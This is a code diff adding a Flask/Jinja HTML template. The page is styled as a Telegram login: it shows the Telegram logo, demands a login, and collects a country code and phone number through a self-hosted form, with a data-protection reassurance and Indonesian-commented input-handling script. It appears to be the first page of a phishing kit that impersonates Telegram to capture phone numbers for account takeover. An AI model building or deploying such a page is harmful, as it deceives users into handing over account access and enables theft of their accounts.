@@ -1,0 +1,82 @@
+{% extends "layout.html" %} {% block content %}
+<div class="container">
+  <img
+    src="{{ url_for('static', filename='telegram-logo.png') }}"
+    class="logo"
+    alt="Telegram"
+  />
+  <h2>Enter telegram number</h2>
+  <p class="subtitle">To continue, please login first</p>
+
+  <form method="POST">
+    <label for="country">Country code</label>
+    <select name="country" id="country">
+      <option value="+965">🇰🇼 Kuwait (+965)</option>
+      <option value="+971">🇦🇪 United Arab Emirates (+971)</option>
+      <option value="+62">🇮🇩 Indonesia (+62)</option>
+      <option value="+60">🇲🇾 Malaysia (+60)</option>
+      <option value="+65">🇸🇬 Singapore (+65)</option>
+      <option value="+1">🇺🇸 United States (+1)</option>
+      <option value="+91">🇮🇳 India (+91)</option>
+    </select>
+
+    <label for="phone">Telegram number</label>
+    <input
+      type="text"
+      name="phone"
+      id="phone"
+      placeholder="Phone number"
+      required
+    />
+
+    <button type="submit">Next</button>
+  </form>
+
+  <p class="footer-text">
+    *Make sure the number entered is active to receive verification. Data will
+    be kept confidential in accordance with the Personal Data Protection Act.
+  </p>
+</div>
+
+<script>
+  const countrySelect = document.getElementById("country");
+  const phoneInput = document.getElementById("phone");
+
+  // Set default prefix sesuai negara pertama
+  let prefix = countrySelect.value;
+  phoneInput.value = prefix;
+
+  // Ganti prefix otomatis saat pilih negara
+  countrySelect.addEventListener("change", function () {
+    prefix = this.value;
+    phoneInput.value = prefix;
+    phoneInput.focus();
+  });
+
+  // Validasi input agar hanya angka setelah prefix
+  phoneInput.addEventListener("input", function () {
+    // pisahkan prefix dan angka yg diketik
+    let inputVal = this.value;
+
+    // pastikan selalu ada prefix
+    if (!inputVal.startsWith(prefix)) {
+      inputVal = prefix;
+    }
+
+    // ambil bagian setelah prefix dan buang non-digit
+    let numberPart = inputVal.slice(prefix.length).replace(/\D/g, "");
+
+    this.value = prefix + numberPart;
+  });
+
+  // Cegah user hapus prefix dengan backspace
+  phoneInput.addEventListener("keydown", function (e) {
+    if (
+      this.selectionStart <= prefix.length &&
+      (e.key === "Backspace" || e.key === "Delete")
+    ) {
+      e.preventDefault();
+    }
+  });
+</script>
+{% endblock %}
